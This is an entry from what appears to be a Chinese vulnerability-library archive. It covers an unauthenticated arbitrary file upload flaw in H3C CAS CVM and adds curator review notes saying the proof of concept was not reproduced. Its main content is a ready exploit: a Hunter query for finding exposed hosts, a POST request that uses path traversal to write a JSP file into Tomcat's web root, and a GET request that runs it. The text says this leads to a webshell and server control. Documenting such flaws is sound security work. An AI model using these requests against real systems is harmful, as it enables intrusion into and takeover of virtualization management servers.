---
source: "wy876 漏洞文库"
id: "vw-d0266d2bb717cc27fd1d6a59"
entity_id: "ve-d0266d2bb717cc27fd1d6a59"
schema_version: "1"
title: "H3C CVM 前台任意文件上传漏洞"
product: "H3C CAS CVM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未认证声明；Tomcat8路径；要求Content-Range"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/H3C/H3CCVM%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nwfsvgilkdhpnsd0"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"H3C CAS 云服务\""
---

# H3C CVM 前台任意文件上传漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：H3C CAS CVM
- 本文讨论：fileUpload/upload token路径遍历写文件
- 版本、权限与配置前提：未认证声明；Tomcat8路径；要求Content-Range
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Content-Range0-10/20与载荷长度不符，固定值缘由未说明；GET同头是否必要未证
- 版本缺失，hunter误存fofa且值残缺
- 与125 fd不同入口同token写文件，应保留变体待关联
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- range语义、fd/upload版本差异待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
H3C公司依托其强大的技术实力、产品与服务优势，以及深入人心的以客户为中心的理念，为企业数据中心IaaS云计算基础架构提供最优化的虚拟化与云业务运营解决方案。通过H3C CAS CVM虚拟化管理系统实现数据中心虚拟化环境的中央管理控制，以简洁的管理界面，统一管理数据中心内所有的物理资源和虚拟资源，不仅能提高管理员的管控能力、简化日常例行工作，更可降低IT环境的复杂度和管理成本。H3C CVM存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。

# 二、影响版本
+ H3C CVM

## 三、资产测绘
+ hunter `app.name="H3C CAS 云服务"`
+ 特征


## 四、漏洞复现
```http
POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc.jsp&name=222 HTTP/1.1
Host: xx.xx.xx.xx
Content-Range: bytes 0-10/20
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 23

<%out.print("99999");%>
```


文件上传位置，请求需携带请求头Content-Range: bytes 0-10/20

```http
GET /cas/js/lib/buttons/stc.jsp HTTP/1.1
Host: xx.xx.xx.xx
Content-Range: bytes 0-10/20
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nwfsvgilkdhpnsd0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
